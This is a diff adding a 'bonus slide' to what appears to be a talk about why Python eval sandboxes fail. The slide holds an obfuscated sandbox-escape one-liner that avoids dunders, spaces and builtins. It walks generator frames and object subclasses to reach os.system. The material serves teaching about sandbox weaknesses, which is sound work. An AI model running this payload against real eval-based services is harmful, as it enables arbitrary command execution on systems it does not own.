@@ -99,3 +99,15 @@ Even if you were successful:
 - json.loads
 - custom parsing
 - <https://github.com/python-discord/snekbox/>
+
+===============
+
+## Bonus slide: no dunders, no spaces, no builtins
+
+!unsetlocal exec
+
+```python
+[*([x.append(((x[0].gi_frame.f_back.f_back.f_globals)for()in((),)))or(x[0])for(x)in[[]]][0])][0]["\x5f\x5fbuiltins\x5f\x5f"].eval('((x.{0}call{0}.{0}globals{0})for(x)in"".{0}class{0}.{0}bases{0}[0].{0}subclasses{0}()if"{0}globals{0}"in(x).{0}call{0}.{0}dir{0}()).{0}next{0}()["sys"].modules["os"]'.format('\x5f\x5f')).system
+```
+
+(courtesy of Python Discord's `#esoteric-python` channel)
